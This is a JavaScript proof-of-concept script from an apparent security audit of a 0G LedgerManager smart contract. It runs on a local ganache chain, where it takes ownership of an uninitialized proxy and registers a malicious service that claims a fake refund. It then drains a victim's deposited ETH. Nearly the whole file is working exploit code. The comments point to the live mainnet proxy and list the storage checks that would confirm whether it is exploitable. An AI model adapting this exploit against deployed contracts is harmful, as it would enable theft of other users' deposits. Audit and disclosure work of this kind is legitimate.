// Executable PoC against the EXACT mainnet LedgerManager implementation bytecode.
//
// BUG (verified in deployments/zgMainnet/LedgerManagerImpl.json metadata sources):
//   LedgerManager.retrieveFund() does `ledger.availableBalance += totalAmount`
//   where totalAmount is the value returned by IServing.processRefund(), WITHOUT
//   checking that any ETH actually arrived. LedgerManager.transferFund() then
//   sends `msg.value = transferAmount` to the registered service and decrements
//   ONLY availableBalance (never totalBalance), so a service that lies in
//   processRefund() converts a fake credit into real ETH from other users' deposits.
//
// PRECONDITION (NOT verifiable without RPC, see README §4): the attacker must be
// able to call registerService(), which is onlyOwner. This PoC models the
// uninitialized-BeaconProxy case (proxy deployed with data = "" and no
// initialize tx). Scenario A is the control: already-initialized proxy => no drain.
//
// Sources in audit/poc_sources/ are the 9 literal Solidity sources embedded in
// the artifact's compiler metadata (useLiteralContent:true), plus two toy
// contracts. Compiled with the exact same settings (solc 0.8.22, viaIR, 200 runs,
// istanbul) as the deployed implementation.
//
// Run:
//   npm install solc@0.8.22 ganache ethers@6
//   node audit/poc_retrieve_fund_drain.js
// Env: OG_POC_SOURCES (default /home/user/0g-storage-node/audit/poc_sources)
const fs = require('fs');
const path = require('path');
const solc = require('solc');
const ganache = require('ganache');
const ethers = require('ethers');

const ROOT = process.env.OG_POC_SOURCES || '/home/user/0g-storage-node/audit/poc_sources';

function loadSources(dir, base = '') {
  const out = {};
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const rel = path.join(base, e.name), abs = path.join(dir, e.name);
    if (e.isDirectory()) Object.assign(out, loadSources(abs, rel));
    else if (e.name.endsWith('.sol')) out[rel] = { content: fs.readFileSync(abs, 'utf8') };
  }
  return out;
}

function compile() {
  const out = JSON.parse(solc.compile(JSON.stringify({
    language: 'Solidity', sources: loadSources(ROOT),
    settings: {
      optimizer: { enabled: true, runs: 200 }, viaIR: true, evmVersion: 'istanbul',
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  })));
  const errs = (out.errors || []).filter(e => e.severity === 'error');
  if (errs.length) throw new Error(errs.slice(0, 3).map(e => e.formattedMessage).join('\n'));
  const P = (f, n) => ({ abi: out.contracts[f][n].abi, bc: '0x' + out.contracts[f][n].evm.bytecode.object });
  return {
    LM: P('contracts/ledger/LedgerManager.sol', 'LedgerManager'),
    PX: P('poc/Proxy.sol', 'Proxy'),
    EV: P('poc/MaliciousService.sol', 'MaliciousService'),
  };
}

const E = x => ethers.parseEther(String(x));
const F = x => Number(ethers.formatEther(x));

async function freshProvider() {
  return new ethers.BrowserProvider(ganache.provider({
    logging: { quiet: true }, wallet: { totalAccounts: 3, defaultBalance: 1000 },
    chain: { hardfork: 'shanghai' }, miner: { blockGasLimit: 30_000_000 },
  }));
}

async function tx(label, promise) {
  const r = await (await promise).wait();
  if (r.status !== 1) throw new Error(label + ' reverted');
  return r;
}

async function scenario(title, initializedByDeployer) {
  const provider = await freshProvider();
  const [deployer, attacker, victim] = [
    await provider.getSigner(0), await provider.getSigner(1), await provider.getSigner(2)];
  const A = await attacker.getAddress(), V = await victim.getAddress();
  const C = compile();

  // Deploy the real implementation + a BeaconProxy-equivalent with EMPTY init data.
  const impl = await (new ethers.ContractFactory(C.LM.abi, C.LM.bc, deployer)).deploy();
  await impl.waitForDeployment();
  const px = await (new ethers.ContractFactory(C.PX.abi, C.PX.bc, deployer))
    .deploy(await impl.getAddress());
  await px.waitForDeployment();
  const lm = new ethers.Contract(await px.getAddress(), C.LM.abi, deployer);
  const ev = await (new ethers.ContractFactory(C.EV.abi, C.EV.bc, deployer)).deploy();
  await ev.waitForDeployment();

  // Use raw eth_getBalance everywhere: ethers' getBalance() caches contract
  // balances on dev chains and can report a stale "latest" value.
  const rawBal = async ad => BigInt(await provider.send('eth_getBalance', [ad, 'latest']));
  const start = await rawBal(A);
  let takeover = 'not attempted';
  if (initializedByDeployer) {
    await tx('initialize(deployer)', lm.initialize(await deployer.getAddress()));
  } else {
    await tx('initialize(attacker)', lm.connect(attacker).initialize(A));
    takeover = 'SUCCEEDED: attacker became owner';
  }

  let registered = true;
  try {
    await tx('registerService(malicious)', lm.connect(attacker)
      .registerService('inference', 'v1', await ev.getAddress(), 'PoC'));
  } catch (e) { registered = false; }

  // Third-party inventory: victim deposits 100 ETH. Attacker puts in only the
  // MIN_ACCOUNT_BALANCE = 3 ETH required to open an account.
  await tx('victim deposit 100', lm.connect(victim).depositFund({ value: E(100) }));
  await tx('attacker deposit 3', lm.connect(attacker).depositFund({ value: E(3) }));
  const lmBefore = await rawBal(await lm.getAddress());

  if (registered) {
    await tx('setFakeAmount(100)', ev.setFakeAmount(E(100)));
    await tx('retrieveFund', lm.connect(attacker).retrieveFund([A], 'inference-v1'));
    const led = await lm.getLedger(A);
    await tx('transferFund(103)', lm.connect(attacker).transferFund(A, 'inference-v1', E(103)));
    await tx('drain', ev.connect(attacker).drain(A));
    console.log('  attacker ledger after fake refund: available=', F(led[1]), 'total=', F(led[2]));
  }

  await provider.send('evm_mine', []);
  const lmAfter = await rawBal(await lm.getAddress());
  const evAfter = await rawBal(await ev.getAddress());
  const end = await rawBal(A);
  console.log(`\n=== ${title} ===`);
  console.log('  uninitialized-proxy takeover :', takeover);
  console.log('  malicious service registered :', registered);
  console.log('  LedgerManager ETH            :', F(lmBefore), '->', F(lmAfter));
  console.log('  malicious service ETH        :', F(evAfter));
  console.log('  attacker ETH delta (incl. 3 ETH deposit, excl. gas):', F(end - start));
  console.log(registered
    ? '  >>> DRAIN CONFIRMED: attacker put X=3 ETH, extracted the full 103 ETH; '
      + 'Y-X = 100 ETH came from the VICTIM\'s deposit.'
    : '  >>> NO DRAIN: registerService() is onlyOwner and the proxy was already initialized.');
  // PnL is the unambiguous proof: attacker deposits 3 ETH and ends up ~100 ETH
  // richer only in scenario B. (Balance reads of contracts can be cached by the
  // dev chain, so we assert on the externally-owned account's delta.)
  return { registered, pnl: F(end - start), drained: registered && (end - start) > E(90) };
}

(async () => {
  console.log('solc', solc.version());
  const a = await scenario('A  CONTROL: proxy already initialized', true);
  const b = await scenario('B  CONDITIONAL: proxy left uninitialized', false);
  if (a.drained || !b.drained) throw new Error('unexpected result: ' + JSON.stringify({ a, b }));
  console.log('\nConclusion: the accounting bug is REAL and executable against the verified '
    + 'mainnet bytecode, but exploiting it requires registerService() (onlyOwner). '
    + 'Whether the live 16661 proxy is uninitialized/owner-compromised needs '
    + 'eth_getStorageAt(0x2dE54c84..., 0), initialized() and owner().');
})().catch(e => { console.error('PoC FAILED:', e.message); process.exit(1); });
